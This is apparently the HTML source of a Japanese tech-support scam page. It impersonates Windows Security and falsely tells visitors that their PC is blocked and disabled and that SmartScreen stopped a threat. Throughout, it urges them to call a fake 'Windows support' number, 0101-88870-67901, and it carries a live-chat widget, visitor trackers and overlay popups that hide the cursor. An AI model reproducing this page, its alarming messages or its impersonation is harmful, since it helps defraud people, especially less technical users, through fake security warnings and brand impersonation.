...
<script type="text/javascript" id="zsiqchat">var $zoho=$zoho || {};$zoho.salesiq = $zoho.salesiq || {widgetcode: "siqa69ba5cc7cae838b549772c240f443e417044d7cfab611ddbb1722582cd6d5ad", values:{},ready:function(){}};var d=document;s=d.createElement("script");s.type="text/javascript";s.id="zsiqscript";s.defer=true;s.src="https://salesiq.zohopublic.in/widget";t=d.getElementsByTagName("script")[0];t.parentNode.insertBefore(s,t);</script>
...
<div class="innerContainer">
    ...
    <span aria-hidden="true">X</span>
         ...
         <!--   <video  width=350px; height=350px; preload="auto" autoplay loop muted="muted" volume="0" >
            <source src="../images/R1_04.mp4" type="video/mp4">
            </video>
            </br>
            <img src="../images/closeandplay.jpg" >
      <!--  <center>  
      <p style=" position: center; font-size: 16px; color: black;">Close & Play</p> </center>-->
                </div>
      ...
      <div class="row">
        <div class="col-md-12">
          <div class="right-foot" style="text-align:center">
            <span id="footertxt">
              <img src="msmm.png"> Windowsのセキュリティ </span>
            <span style="font-weight:500;padding-left:13px;color:#fff; ">Windows サポートに電話する: <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> 0101-88870-67901
              </span>
            </span>
          </div>
        </div>
    ...
    <div class="lightbox" id="poptxt" style="display: block;">
      ...
      <div id="disclaimer">この PC へのアクセスはセキュリティ上の理由からブロックされています.  <br>
        <span class="support" style="font-size:22px;">Windows サポートに電話してください:<br><span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> 0101-88870-67901
          </span>
        </span>
      </div>
      <div id="bottom">
    ...
    <div class="cardcontainer" style="cursor: none; display: block;" id="pop_up_new">
      ...
      <p style="padding-bottom:0;color:#fff;font-size:16px">Windows サポートに電話する: <strong>
          <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">0101-88870-67901
          </span>
        </strong>
      </p>
    ...
    <div class="answer_list" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
      <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">すぐに当社にご連絡ください。当社のエンジニアが電話で削除プロセスを案内いたします。お使いのコンピュータは無効になっています。Windows Defender SmartScreen により、認識されないアプリケーションの表示が防止されました。 このアプリケーションを実行すると、PC が危険にさらされる可能性があります。 <br>
        <strong>Windows サポートに電話する: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"> 0101-88870-67901
        </strong>
      </p>
    </div>
    <div id="chat" style="display: block;">
      ...
      <h4 style="font-weight:600;font-size:22px"> 0101-88870-67901
        <br>(セキュリティサポート)
      </h4>
...
<!-- Default Statcounter code for Outmax.store
http://outmax.store -->
<script type="text/javascript">
var sc_project=12192640; 
var sc_invisible=1; 
var sc_security="529780cc"; 
</script>
<script type="text/javascript"
...
class="statcounter"
src="https://c.statcounter.com/12192640/0/529780cc/1/"
alt="hit counter"
...
_Hasync.push(['Histats.start', '1,4056318,4,107,170,20,00010000']);
...
<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4056318&101" alt="free web page hit counter" border="0"></a></noscript>
<!-- Histats.com  END  -->

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-SZQ5F5J2JH"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-SZQ5F5J2JH');
</script>
</html>
...
<script type="text/javascript">
  ...
  (function() {
    ...
    t.async = true;
    t.id    = 'gauges-tracker';
    t.setAttribute('data-site-id', '6741e256c138fa47362fbada');
